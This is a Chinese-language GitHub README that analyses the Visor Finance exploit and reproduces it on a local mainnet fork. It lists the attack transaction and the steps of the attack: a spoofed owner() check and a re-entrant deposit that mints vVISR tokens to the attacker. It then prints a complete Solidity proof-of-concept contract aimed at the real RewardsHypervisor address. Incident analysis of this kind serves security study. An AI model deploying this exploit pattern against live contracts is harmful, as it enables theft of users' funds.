# Visor_Finance_Vul_Poc
Visor Finance 攻击事件的分析和复现


## 事件分析

* 攻击交易

```
0x69272d8c84d67d1da2f6425b339192fa472898dce936f24818fda415c1c1ff3f
```

* 攻击发生的块高度

```
13849007 
```
* 攻击步骤

1. 调用`RewardsHypervisor`的`deposit`函数, 传入参数为：
    1. 质押数量： 100000000000000000000000000
    2. From 地址： 攻击合约自己的地址
    3. To 地址: 攻击者的EOA地址

2.  第一步操作会回调攻击合约的`owner`函数, 攻击合约的返回值为: 攻击合约自己的地址

3.  第一步操作还会再次回调攻击合约的`delegatedTransferERC20`函数, 导致重入攻击
    在`delegatedTransferERC20`函数中, 攻击合约再次调用`RewardsHypervisor`的`deposit`函数,传入参数与第一步相同
    (这一步我在POC中省略了)

4.  绕过`require(IVisor(from).owner() == msg.sender)`的检测后, `RewardsHypervisor`合约给攻击者的EOA地址铸造了  
    `97624975481815716136709737`个`vVISR`
    
    
## 复现

* fork

```
npx ganache-cli  --fork https://eth-mainnet.alchemyapi.io/v2/your_api_key@13849006   -l 4294967295
```

* 部署攻击合约

* 因为攻击步骤过于简单, 所以下面是完整代码, 可以直接复制

```js
// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.7.0 <0.9.0;

interface IRewardsHypervisor {
    function deposit(
        uint256 visrDeposit,
        address from,
        address to
    ) external returns (uint256 shares);

    function owner() external view returns (address);

    function snapshot() external;

    function transferOwnership(address newOwner) external;

    function transferTokenOwnership(address newOwner) external;

    function visr() external view returns (address);

    function vvisr() external view returns (address);

    function withdraw(
        uint256 shares,
        address to,
        address from
    ) external returns (uint256 rewards);
}


contract poc{
    
    address RewardsHypervisor_Address = 0xC9f27A50f82571C1C8423A42970613b8dBDA14ef;

    address public EOA_Address;

    constructor() {

        EOA_Address =  msg.sender;
    
    }

    function attack() external{

        IRewardsHypervisor(RewardsHypervisor_Address).deposit(100000000000000000000000000,address(this),EOA_Address);

    }


    function owner() external returns(address){

        return(address(this));

    }


    function delegatedTransferERC20(address token, address to, uint256 amount) external{}

}
```

* 点击`Attack`

![image](https://github.com/W2Ning/Visor_Finance_Vul_Poc/blob/main/images/attack.png)

* 攻击结束

![image](https://github.com/W2Ning/Visor_Finance_Vul_Poc/blob/main/images/success.png)
